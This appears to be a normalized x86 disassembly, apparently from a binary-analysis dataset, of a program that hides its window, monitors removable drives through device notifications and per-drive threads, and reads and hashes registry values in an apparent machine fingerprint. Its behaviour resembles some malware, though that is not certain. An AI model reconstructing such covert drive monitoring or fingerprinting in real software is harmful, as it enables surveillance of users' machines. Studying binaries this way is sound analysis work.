mov ecx [ ebp - 0x6dc ]
call sub_4011f7
cmp [ ebp - 0x6e0 ] eax
jge r-xdata
mov ecx [ ebp - 0x6dc ]
call sub_401ca3
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x6d4 ]
call sub_40fca2
lea eax [ ebp - 0x38 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_415a51
lea ecx [ ebp - 0x38 ]
call sub_4106f0
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x6d4 ]
call sub_40fdaa
mov eax [ ebp + 0xc ]
imul eax eax 0xa0
cmp [ eax + rw-data ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
imul eax eax 0xa0
cmp [ eax + rw-data ] 0x0
je r-xdata
jmp r-xdata
jmp r-xdata
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp + 0xc ]
imul eax eax 0xa0
cmp [ eax + rw-data ] 0x0
je r-xdata
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp - 0x6dc ]
push [ ebp - 0x470 ]
lea eax [ ebp - 0x48 ]
push eax
push [ ebp + 0x8 ]
call sub_40a5a6
add esp 0x14
movzx eax al
test eax eax
jne r-xdata
push [ ebp - 0x6e0 ]
mov ecx [ ebp - 0x6dc ]
call sub_401ccc
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
call sub_417232
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x6e0 ]
inc eax
mov [ ebp - 0x6e0 ] eax
sub_40ac1c
push ebp
mov ebp esp
push 0xffffffff
push sub_423d21
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_413925
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a4c2
pop ecx
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a4f3
pop ecx
mov ecx [ ebp - 0x18 ]
mov ecx [ ecx + 0x4 ]
imul ecx ecx 0xa0
mov [ ecx + rw-data ] eax
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x18 ]
push [ eax + 0x4 ]
push [ ebp - 0x14 ]
call sub_40a8ff
pop ecx
pop ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a4c2
pop ecx
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a4c2
pop ecx
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x4 ]
imul eax eax 0xa0
push [ eax + rw-data ]
call [ UnregisterDeviceNotification@IAT ]
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x14 ]
call sub_417232
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_40ad1c
push ebp
mov ebp esp
sub esp 0xc
push 0x8
pop edx
mov ecx [ ebp + 0x8 ]
call sub_417318
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push [ ebp - 0xc ]
push sub_40ac1c
push 0x10000
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
leave
retn
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
sub_40ad76
push ebp
mov ebp esp
sub esp 0x54
mov eax [ ebp + 0xc ]
mov [ ebp - 0x50 ] eax
cmp [ ebp - 0x50 ] 0x10
je r-xdata
push [ rw-data ]
call [ UnregisterDeviceNotification@IAT ]
push [ rw-data ]
call [ CloseHandle@IAT ]
and [ ebp - 0x4c ] 0x0
jmp r-xdata
cmp [ ebp - 0x50 ] 0x12
je r-xdata
cmp [ ebp - 0x4c ] 0x1a
jge r-xdata
push 0x0
call [ PostQuitMessage@IAT ]
jmp r-xdata
cmp [ ebp - 0x50 ] 0x219
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ DefWindowProcW@IAT ]
leave
retn 0x10
mov eax [ ebp - 0x4c ]
imul eax eax 0xa0
push [ eax + rw-data ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x4c ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a4c2
pop ecx
mov eax [ ebp - 0x4c ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a4c2
pop ecx
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x54 ] eax
cmp [ ebp - 0x54 ] 0x8000
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4c ]
inc eax
mov [ ebp - 0x4c ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x2
jne r-xdata
cmp [ ebp - 0x54 ] 0x8001
je r-xdata
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x3c ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x6
jne r-xdata
cmp [ ebp - 0x54 ] 0x8004
je r-xdata
jmp r-xdata
cmp [ ebp - 0x3c ] 0x1a
jge r-xdata
jmp r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x40 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x2
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp - 0x3c ]
shr eax cl
and eax 0x1
je r-xdata
cmp [ ebp - 0x40 ] 0x1a
jge r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4 ] 0x6
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x8 ] eax
and [ ebp - 0x44 ] 0x0
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x3c ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a4c2
pop ecx
mov eax [ ebp - 0x3c ]
imul eax eax 0xa0
and [ eax + rw-data ] 0x0
mov eax [ ebp - 0x3c ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a4c2
pop ecx
mov eax [ ebp - 0x3c ]
imul eax eax 0xa0
and [ eax + rw-data ] 0x0
push r--data
mov eax [ ebp - 0x3c ]
imul eax eax 0xa0
add eax rw-data
push eax
call [ lstrcpyW@IAT ]
mov eax [ ebp - 0x3c ]
add eax 0x41
mov ecx [ ebp - 0x3c ]
imul ecx ecx 0xa0
mov [ ecx + rw-data ] ax
push r--data
mov eax [ ebp - 0x3c ]
imul eax eax 0xa0
add eax rw-data
push eax
call [ lstrcpyW@IAT ]
mov eax [ ebp - 0x3c ]
add eax 0x41
mov ecx [ ebp - 0x3c ]
imul ecx ecx 0xa0
mov [ ecx + rw-data ] ax
push r--data
mov eax [ ebp - 0x3c ]
imul eax eax 0xa0
add eax rw-data
push eax
call [ lstrcpyW@IAT ]
mov eax [ ebp - 0x3c ]
add eax 0x41
mov ecx [ ebp - 0x3c ]
imul ecx ecx 0xa0
mov [ ecx + rw-data ] ax
mov eax [ ebp - 0x3c ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a505
pop ecx
movzx eax al
test eax eax
jne r-xdata
mov eax [ ebp - 0x40 ]
imul eax eax 0xa0
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0xc ]
cmp ecx [ eax + rw-data ]
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x48 ] 0x0
jmp r-xdata
cmp [ ebp - 0x44 ] 0x1a
jge r-xdata
mov eax [ ebp - 0x3c ]
inc eax
mov [ ebp - 0x3c ] eax
push 0x0
push 0x2000000
push 0x3
push 0x0
push 0x7
push 0x80000000
mov eax [ ebp - 0x3c ]
imul eax eax 0xa0
add eax rw-data
push eax
call [ CreateFileW@IAT ]
mov ecx [ ebp - 0x3c ]
imul ecx ecx 0xa0
mov [ ecx + rw-data ] eax
push 0x2c
push 0x0
lea eax [ ebp - 0x38 ]
push eax
call sub_4031e0
add esp 0xc
mov [ ebp - 0x38 ] 0x2c
mov [ ebp - 0x34 ] 0x6
mov eax [ ebp - 0x3c ]
imul eax eax 0xa0
mov eax [ eax + rw-data ]
mov [ ebp - 0x2c ] eax
push 0x0
lea eax [ ebp - 0x38 ]
push eax
push [ ebp + 0x8 ]
call [ RegisterDeviceNotificationW@IAT ]
mov ecx [ ebp - 0x3c ]
imul ecx ecx 0xa0
mov [ ecx + rw-data ] eax
push [ ebp - 0x3c ]
call sub_414299
push eax
call sub_40ad1c
pop ecx
pop ecx
jmp r-xdata
mov eax [ ebp - 0x40 ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a4f3
pop ecx
mov ecx [ ebp - 0x40 ]
imul ecx ecx 0xa0
mov [ ecx + rw-data ] eax
mov eax [ ebp - 0x40 ]
imul eax eax 0xa0
push [ eax + rw-data ]
call [ CloseHandle@IAT ]
cmp [ ebp - 0x48 ] 0x1a
jge r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0xc ]
mov ecx [ ebp - 0x44 ]
shr eax cl
and eax 0x1
je r-xdata
mov eax [ ebp - 0x40 ]
inc eax
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x48 ]
imul eax eax 0xa0
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx + 0xc ]
cmp ecx [ eax + rw-data ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x44 ]
imul eax eax 0xa0
cmp [ eax + rw-data ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x48 ]
imul eax eax 0xa0
cmp [ eax + rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x44 ]
inc eax
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x44 ]
imul eax eax 0xa0
cmp [ eax + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x48 ]
inc eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
imul eax eax 0xa0
cmp [ eax + rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x44 ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a4f3
pop ecx
mov ecx [ ebp - 0x44 ]
imul ecx ecx 0xa0
mov [ ecx + rw-data ] eax
mov eax [ ebp - 0x44 ]
imul eax eax 0xa0
push [ eax + rw-data ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x44 ]
imul eax eax 0xa0
push [ eax + rw-data ]
call [ UnregisterDeviceNotification@IAT ]
mov eax [ ebp - 0x48 ]
imul eax eax 0xa0
add eax rw-data
push eax
call sub_40a4f3
pop ecx
mov ecx [ ebp - 0x48 ]
imul ecx ecx 0xa0
mov [ ecx + rw-data ] eax
mov eax [ ebp - 0x48 ]
imul eax eax 0xa0
push [ eax + rw-data ]
call [ CloseHandle@IAT ]
mov eax [ ebp - 0x48 ]
imul eax eax 0xa0
push [ eax + rw-data ]
call [ UnregisterDeviceNotification@IAT ]
sub_40b21d
push ebp
mov ebp esp
sub esp 0x50
push 0x30
push 0x0
lea eax [ ebp - 0x50 ]
push eax
call sub_4031e0
add esp 0xc
mov [ ebp - 0x50 ] 0x30
mov [ ebp - 0x4c ] 0x4000
mov [ ebp - 0x48 ] sub_40ad76
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x40 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_413314
mov [ ebp - 0x3c ] eax
and [ ebp - 0x38 ] 0x0
and [ ebp - 0x34 ] 0x0
and [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] r--data
mov [ ebp - 0x28 ] r--data
and [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x50 ]
push eax
call [ RegisterClassExW@IAT ]
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_413314
push eax
push 0x0
push 0x0
push 0xc8
push 0xc8
push 0x0
push 0x0
push 0x2000000
push r--data
push r--data
push 0x0
call [ CreateWindowExW@IAT ]
mov [ rw-data ] eax
push 0x2000000
push 0xfffffff0
push [ rw-data ]
call [ SetWindowLongW@IAT ]
push 0x8000000
push 0xffffffec
push [ rw-data ]
call [ SetWindowLongW@IAT ]
push 0x0
push [ rw-data ]
call [ ShowWindow@IAT ]
push 0x20
push 0x0
lea eax [ ebp - 0x20 ]
push eax
call sub_4031e0
add esp 0xc
mov [ ebp - 0x20 ] 0x20
mov [ ebp - 0x1c ] 0x5
push 0x10
push r--data
lea eax [ ebp - 0x14 ]
push eax
call sub_4026b0
add esp 0xc
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push [ rw-data ]
call [ RegisterDeviceNotificationW@IAT ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
mov al 0x1
xor al al
jmp r-xdata
leave
retn
sub_40b349
push ebp
mov ebp esp
push 0xffffffff
push sub_423d3e
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x9c
push esi
push edi
lea ecx [ ebp - 0xa4 ]
call sub_401068
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x30 ]
call sub_416c24
mov [ ebp - 0x4 ] 0x1
mov eax [ r--data ]
mov [ ebp - 0x40 ] eax
mov eax [ r--data ]
mov [ ebp - 0x3c ] eax
xor eax eax
lea edi [ ebp - 0x38 ]
stosd [ edi ]
stosd [ edi ]
push 0xc
pop ecx
mov esi r--data
lea edi [ ebp - 0x74 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
push rw-data
push 0x3b
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_401f90
mov ecx rw-data
call sub_4011f7
mov [ rw-data ] eax
push rw-data
push 0x3b
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_401f90
mov ecx rw-data
call sub_4011f7
mov [ rw-data ] eax
push rw-data
push 0x3b
mov edx r--data
mov ecx [ ebp + 0x8 ]
call sub_401f90
mov ecx rw-data
call sub_4011f7
mov [ rw-data ] eax
push 0x10e0
push 0x0
push rw-data
call sub_4031e0
add esp 0xc
push [ ebp + 0x8 ]
call sub_40b21d
pop ecx
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0xa5 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x30 ]
call sub_416bd2
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0xa4 ]
call sub_4010a3
mov al [ ebp - 0xa5 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
leave
retn
and [ ebp - 0x10 ] 0x0
jmp r-xdata
cmp [ ebp - 0x10 ] 0x18
jae r-xdata
xor eax eax
inc eax
je r-xdata
mov eax [ ebp - 0x10 ]
mov ax [ ebp + eax * 2 - 0x74 ]
mov [ ebp - 0x40 ] ax
lea eax [ ebp - 0x40 ]
push eax
call [ GetDriveTypeW@IAT ]
mov [ ebp - 0x94 ] eax
cmp [ ebp - 0x94 ] 0x2
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x90 ]
push eax
call [ PeekMessageW@IAT ]
test eax eax
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
movzx eax [ ebp + eax * 2 - 0x74 ]
sub eax 0x41
push eax
push [ ebp + 0x8 ]
call sub_40ad1c
pop ecx
pop ecx
jmp r-xdata
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x90 ]
push eax
call [ GetMessageW@IAT ]
test eax eax
jne r-xdata
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x90 ]
push eax
call [ DispatchMessageW@IAT ]
jmp r-xdata
jmp r-xdata
sub_40b51b
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov ax [ eax ]
mov [ ebp - 0x8 ] ax
mov eax [ ebp + 0x8 ]
inc eax
inc eax
mov [ ebp + 0x8 ] eax
movzx eax [ ebp - 0x8 ]
cmp eax 0x61
jl r-xdata
movzx eax [ ebp - 0x8 ]
cmp eax 0x30
jl r-xdata
movzx eax [ ebp - 0x8 ]
cmp eax 0x7a
jg r-xdata
movzx eax [ ebp - 0x8 ]
cmp eax 0x41
jl r-xdata
movzx eax [ ebp - 0x8 ]
cmp eax 0x39
jg r-xdata
movzx eax [ ebp - 0x8 ]
sub eax 0x20
mov [ ebp - 0x8 ] ax
xor eax eax
jmp r-xdata
movzx eax [ ebp - 0x8 ]
cmp eax 0x46
jg r-xdata
movzx eax [ ebp - 0x8 ]
sub eax 0x30
mov [ ebp - 0x8 ] ax
jmp r-xdata
leave
retn
movzx eax [ ebp - 0x8 ]
sub eax 0x37
mov [ ebp - 0x8 ] ax
jmp r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x4
mov [ ebp - 0x4 ] eax
movzx eax [ ebp - 0x8 ]
add eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
test eax eax
je r-xdata
sub_40b5c0
push ebp
mov ebp esp
sub esp 0x48
lea eax [ ebp - 0x14 ]
push eax
push 0x20019
push 0x0
push r--data
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
and [ ebp - 0x1c ] 0x0
jmp r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x1c ] 0x4
jge r-xdata
leave
retn
push [ ebp - 0x14 ]
call [ RegCloseKey@IAT ]
and [ ebp - 0x48 ] 0x0
jmp r-xdata
mov [ ebp - 0x44 ] 0x10
lea eax [ ebp - 0x18 ]
push eax
push 0x20019
push 0x0
mov eax [ ebp - 0x1c ]
push [ eax * 4 + r--data ]
push [ ebp - 0x14 ]
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x48 ] 0x10
jge r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x44 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x18 ]
call [ RegQueryInfoKeyW@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call [ RegCloseKey@IAT ]
xor al al
jmp r-xdata
mov al 0x1
mov eax [ ebp - 0x48 ]
mov eax [ eax * 4 + r--data ]
mov ecx [ ebp + 0xc ]
add ecx [ ebp - 0x48 ]
mov al [ ebp + eax - 0x10 ]
mov [ ecx ] al
jmp r-xdata
push [ ebp - 0x18 ]
call [ RegCloseKey@IAT ]
mov eax [ ebp - 0x44 ]
and [ ebp + eax * 2 - 0x3c ] 0x0
lea eax [ ebp - 0x3c ]
push eax
call sub_40b51b
pop ecx
mov [ ebp - 0x40 ] eax
push 0x4
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x1c ]
lea eax [ ebp + eax * 4 - 0x10 ]
push eax
call sub_402b50
add esp 0xc
jmp r-xdata
push [ ebp - 0x18 ]
call [ RegCloseKey@IAT ]
push [ ebp - 0x14 ]
call [ RegCloseKey@IAT ]
xor al al
jmp r-xdata
mov eax [ ebp - 0x48 ]
inc eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x1c ]
inc eax
mov [ ebp - 0x1c ] eax
sub_40b6eb
push ebp
mov ebp esp
sub esp 0x814
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4 ] eax
push [ ebp + 0xc ]
call [ lstrlenW@IAT ]
cmp eax 0x3
jle r-xdata
mov al 0x1
leave
retn
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x6 ]
cmp eax 0x30
jl r-xdata
mov eax [ ebp + 0xc ]
movzx eax [ eax + 0x6 ]
cmp eax 0x39
jg r-xdata
mov [ ebp - 0xc ] 0x800
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x810 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx 0x80000002
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call sub_41017c
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_40100f
mov [ ebp - 0x814 ] eax
mov eax [ ebp - 0x814 ]
mov eax [ eax ]
inc eax
mov ecx [ ebp - 0x814 ]
mov [ ecx ] eax
push [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
call sub_401345
push [ ebp - 0xc ]
mov ecx [ ebp - 0x4 ]
call sub_410af3
push 0x0
push [ ebp - 0xc ]
lea eax [ ebp - 0x810 ]
push eax
mov ecx [ ebp - 0x4 ]
call sub_410811
sub_40b7ac
push ebp
mov ebp esp
sub esp 0x818
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x814 ] eax
mov eax [ ebp - 0x814 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] 0x800
push [ ebp + 0x8 ]
call [ lstrlenW@IAT ]
dec eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
lea eax [ ecx + eax * 2 + 0x2 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x810 ]
push eax
push r--data
push [ ebp + 0x8 ]
mov edx 0x80000002
mov eax [ ebp - 0x814 ]
mov ecx [ eax ]
call sub_41017c
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x8 ]
movzx eax [ ecx + eax * 2 ]
cmp eax 0x5c
je r-xdata
mov al 0x1
leave
retn
mov ecx [ ebp - 0x10 ]
call sub_40100f
mov [ ebp - 0x818 ] eax
mov eax [ ebp - 0x818 ]
mov eax [ eax ]
inc eax
mov ecx [ ebp - 0x818 ]
mov [ ecx ] eax
push [ ebp - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_401345
push [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
call sub_410af3
push 0x0
push [ ebp - 0x8 ]
lea eax [ ebp - 0x810 ]
push eax
mov ecx [ ebp - 0x10 ]
call sub_410811
mov eax [ ebp - 0xc ]
dec eax
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
jl r-xdata
sub_40b882
push ebp
mov ebp esp
push 0xffffffff
push sub_423acc
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
mov eax 0x1078
call sub_40a0e0
lea ecx [ ebp - 0x5c ]
call sub_416c24
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0x8 ]
call sub_41121b
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x8 ]
call sub_40b5c0
pop ecx
pop ecx
movzx eax al
test eax eax
jne r-xdata
lea eax [ ebp - 0x30 ]
push eax
push 0x10
push 0x3309000
lea ecx [ ebp - 0x5c ]
call sub_41718a
mov [ ebp - 0x3c ] 0x1000
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x105c ]
push eax
push r--data
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_41017c
movzx eax al
test eax eax
jne r-xdata
mov [ ebp - 0x107d ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x5c ]
call sub_416bd2
mov al [ ebp - 0x107d ]
jmp r-xdata
lea eax [ ebp - 0x105c ]
push eax
push [ ebp - 0x3c ]
push 0x62b87d5
lea ecx [ ebp - 0x5c ]
call sub_41718a
mov [ ebp - 0x3c ] 0x1000
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x105c ]
push eax
push 0x0
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_41017c
movzx eax al
test eax eax
je r-xdata
mov [ ebp - 0x107e ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x5c ]
call sub_416bd2
mov al [ ebp - 0x107e ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
leave
retn
mov [ ebp - 0x3c ] 0x1000
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x105c ]
push eax
push 0x0
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_41017c
movzx eax al
test eax eax
je r-xdata
lea eax [ ebp - 0x105c ]
push eax
push [ ebp - 0x3c ]
push 0xd2c74cf
lea ecx [ ebp - 0x5c ]
call sub_41718a
mov [ ebp - 0x3c ] 0x1000
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x105c ]
push eax
push 0x0
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_41017c
movzx eax al
test eax eax
je r-xdata
lea eax [ ebp - 0x105c ]
push eax
push [ ebp - 0x3c ]
push 0x7277b0d
lea ecx [ ebp - 0x5c ]
call sub_41718a
lea ecx [ ebp - 0x106c ]
call sub_401068
mov [ ebp - 0x4 ] 0x1
push 0x0
lea ecx [ ebp - 0x106c ]
call sub_410af3
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x106c ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push sub_40b7ac
push 0x0
push 0x1
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_40feb4
lea ecx [ ebp - 0x106c ]
call sub_401000
test eax eax
jne r-xdata
lea eax [ ebp - 0x105c ]
push eax
push [ ebp - 0x3c ]
push 0x9258bf1
lea ecx [ ebp - 0x5c ]
call sub_41718a
lea ecx [ ebp - 0x106c ]
call sub_40100f
push eax
lea ecx [ ebp - 0x106c ]
call sub_401000
push eax
push 0x3475f3
lea ecx [ ebp - 0x5c ]
call sub_41718a
lea ecx [ ebp - 0x107c ]
call sub_401068
mov [ ebp - 0x4 ] 0x2
push 0x0
lea ecx [ ebp - 0x107c ]
call sub_410af3
lea eax [ ebp - 0x107c ]
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push sub_40b6eb
push 0x1
push 0x0
push r--data
mov edx 0x80000002
mov ecx [ ebp + 0x8 ]
call sub_40feb4
lea ecx [ ebp - 0x107c ]
call sub_401000
test eax eax
je r-xdata
mov [ ebp - 0x107f ] 0x0
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x106c ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x5c ]
call sub_416bd2
mov al [ ebp - 0x107f ]
jmp r-xdata
lea ecx [ ebp - 0x1c ]
call sub_401068
mov [ ebp - 0x4 ] 0x3
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebp - 0x5c ]
call sub_416fc3
mov ecx [ ebp + 0x8 ]
call sub_413b96
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
push 0x0
push 0x28
push [ ebp - 0x20 ]
push 0x0
push 0x80719601
lea ecx [ ebp - 0x1c ]
call sub_401000
push eax
lea ecx [ ebp - 0x1c ]
call sub_40100f
mov edx eax
mov ecx [ ebp + 0x8 ]
call sub_41578c
movzx eax al
test eax eax
jne r-xdata
lea ecx [ ebp - 0x107c ]
call sub_40100f
push eax
lea ecx [ ebp - 0x107c ]
call sub_401000
push eax
push 0x704b24ec
lea ecx [ ebp - 0x5c ]
call sub_41718a
mov [ ebp - 0x1081 ] 0x1
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x107c ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x106c ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x5c ]
call sub_416bd2
mov al [ ebp - 0x1081 ]
mov [ ebp - 0x1080 ] 0x0
mov [ ebp - 0x4 ] 0x2
lea ecx [ ebp - 0x1c ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x107c ]
call sub_4010a3
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x106c ]
call sub_4010a3
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x5c ]
call sub_416bd2
mov al [ ebp - 0x1080 ]
jmp r-xdata
sub_40bc42
push ebp
mov ebp esp
push ecx
push esi
push edi
push 0xffffffff
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
mov [ ebp - 0x1 ] 0x1
cmp [ rw-data ] 0x0
jbe r-xdata
mov [ ebp - 0x1 ] 0x0
